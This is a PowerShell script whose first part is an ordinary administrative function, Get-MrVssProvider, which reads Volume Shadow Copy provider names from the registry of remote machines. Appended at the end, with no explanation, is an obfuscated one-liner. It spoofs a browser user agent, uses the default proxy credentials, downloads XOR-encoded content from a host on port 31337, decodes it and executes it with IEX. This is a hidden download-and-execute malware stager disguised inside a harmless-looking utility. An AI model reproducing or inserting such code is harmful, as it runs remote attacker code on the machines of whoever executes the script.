
function Get-MrVssProvider {



    [CmdletBinding()]
    param (
        [ValidateNotNullOrEmpty()]      
        [string[]]$ComputerName = $env:COMPUTERNAME,

        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty
    )

    $Params = @{
        ComputerName = $ComputerName
        ScriptBlock = {Get-ChildItem -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\VSS\Providers' |
                       Get-ItemProperty -Name '(default)'}
        ErrorAction = 'SilentlyContinue'
        ErrorVariable = 'Problem'
    }

    if ($PSBoundParameters.Credential) {
        $Params.Credential = $Credential
    }

    Invoke-Command @Params |
    Select-Object -Property PSComputerName, @{label='VSSProviderName';expression={$_.'(default)'}}

    foreach ($p in $Problem) {
        if ($p.origininfo.pscomputername) {
            Write-Warning -Message "Unable to read registry key on $($p.origininfo.pscomputername)" 
        }
        elseif ($p.targetobject) {
            Write-Warning -Message "Unable to connect to $($p.targetobject)"
        }
    }

}
$WC=NeW-ObjeCt SYstem.NET.WEBCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeaDErs.ADD('User-Agent',$u);$Wc.PROXY = [SYsTEM.NET.WEbREQuEst]::DeFauLtWebProxY;$wc.PrOXy.CredentIALs = [SySTEM.NEt.CRedENtiAlCache]::DEfAUltNEtwOrkCrEDentIals;$K='w1dBgDnzf!?}v6-E^/`i5.V2L|XWSRlH';$i=0;[CHar[]]$B=([cHAR[]]($Wc.DOwnloAdStRing("http://172.16.0.2:31337/index.asp")))|%{$_-BXOR$k[$I++%$k.LENgtH]};IEX ($b-joIN'')

